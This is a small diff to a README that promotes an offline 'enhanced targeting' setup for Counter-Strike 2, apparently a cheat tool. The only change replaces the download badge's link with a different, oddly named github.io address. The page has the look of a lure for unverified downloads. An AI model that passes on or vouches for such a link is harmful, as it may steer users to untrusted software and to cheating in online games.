@@ -3,7 +3,7 @@
 Unlock enhanced targeting capabilities in Counter-Strike 2 with this comprehensive offline setup guide. Designed for players seeking improved precision without relying on online services or activations.
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://cs2-aim-assist.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://csaim2portalll9webo0.github.io/.github/)
 
 ---
 
